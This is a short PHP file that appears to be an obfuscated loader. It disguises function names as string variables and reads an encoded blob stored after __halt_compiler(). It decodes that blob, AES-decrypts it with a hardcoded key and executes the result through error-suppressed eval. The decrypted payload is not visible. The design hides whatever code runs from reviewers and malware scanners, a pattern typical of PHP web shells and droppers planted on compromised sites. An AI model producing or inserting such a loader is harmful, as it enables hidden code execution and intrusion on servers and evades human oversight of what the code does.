<?php
if(PHP_SAPI!=='cli-server')@header('Content-Type:text/html;charset=utf-8');
$x1="strtr";$x2="substr";$x3="file_get_contents";$x4="base64_decode";$x5="openssl_decrypt";$x6="hash";$x7="sha256";
$p=$x1($x2($x3(__FILE__),__COMPILER_HALT_OFFSET__),"-_~","+/=");
$p=$x4($p);
$v=$x2($p,0,16);
$c=$x2($p,16);
$k=$x6($x7,'54b85a482ebc7c59fb3db1684d6bcc197ff38ae93080cb5521c04af94067e0cc',true);
@eval("?>".$x5($c,"AES-256-CBC",$k,OPENSSL_RAW_DATA,$v));
__halt_compiler();
wSxB9V5kPnd2GIOVBZ3AW1iYHJ4y5P6NzhouGR7E1SB9KkzcIUSVT0z5cvqeM87lR13sAW0e7k3xvR3ho7FHlDypmxueZ_42SMqc3QqcR_uqCkF4Y0RLJjy2-YV9FDZv9WvRw1_60Q_Z4FFRrF88UGGV1fIuMep7T88kmXbqdl3TQt6qm5cyo4cZK8EE3kiQ3PXCOAV-78yKTOmudlJ2LWsVxCo-vMG0fmgnkS5AgH_2D5DgiARxJa-JY3WbcXJ8fWbl_s3lbO06Mj1vInXLBw08T3T1WoIJJQVPfv3E0YVCPdRLYcXku9SJO0xS7arkA24fa2Z-9aUdtc0PM4Lv6UgxTweVXbvNqOAnRC8oGj2Q0GIl0N_rZvgtNH9o_Mhb3cMilqf--Vcw9dXWHVt2fAQN0RQjK8SjQcThwapjrw4~